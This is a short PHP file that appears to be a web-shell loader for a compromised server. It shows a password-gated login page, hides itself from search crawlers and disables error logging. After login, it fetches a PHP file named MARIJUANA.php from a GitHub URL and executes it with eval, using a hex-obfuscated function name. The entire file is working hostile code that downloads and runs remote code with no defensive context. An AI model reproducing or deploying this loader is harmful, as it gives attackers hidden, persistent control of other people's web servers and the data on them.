<?php
error_reporting(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
session_start();
$passwd = "pwnd_g0v3L4";
if($_POST['pass']) {
  if($_POST['passwd'] == $passwd) {
    $_SESSION['masuk'] = "masuk";
    header("Location: ?");
  }
}
if(isset($_REQUEST['logout'])) {
  session_destroy();
  header("Location: ?");
}
if(empty($_SESSION['masuk'])) {
?>
<title>CEH - INDONESIA MERDEKA</title>
<meta name="robots" content="noindex, nofollow">
<meta name="googlebot" content="noindex, nofollow">
<meta name="bingbot" content="noindex, nofollow">
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<link rel="icon" type="image/png" href="https://www.hack.co.id/static/logodark-d86ee889211156c136b291cc0ec22e05.png">
<style>
  html {
    background: #696969;
    color: deeppink;
  }
  input {
    background: #696969;
    color: #F0FFF0;
    border: 1px solid teal;
  }
  @media only screen and (max-width:800px){
     html{
        font-size:20px;
     }
  }
</style>
<center>
<img src="https://www.hack.co.id/static/logodark-d86ee889211156c136b291cc0ec22e05.png" width="1000" height="75">
<table height="100%" width="100%">
  <td align="center">
    <br><br>
    <form enctype="multipart/form-data" method="post">
      <input type="password" name="passwd">
      <input type="submit" name="pass" value="LOGIN">
    </form>
  </td>
</table>
<?php
exit();
}
?>
<?php $_AB = "https://raw.githubusercontent.com/0x5a455553/MARIJUANA/master/MARIJUANA.php";$_B = "\x46\x49\x4c\x45\x5f\x47\x45\x54\x5f\x43\x4f\x4e\x54\x45\x4e\x54\x53"; EVAL("?>".$_B($_AB));?>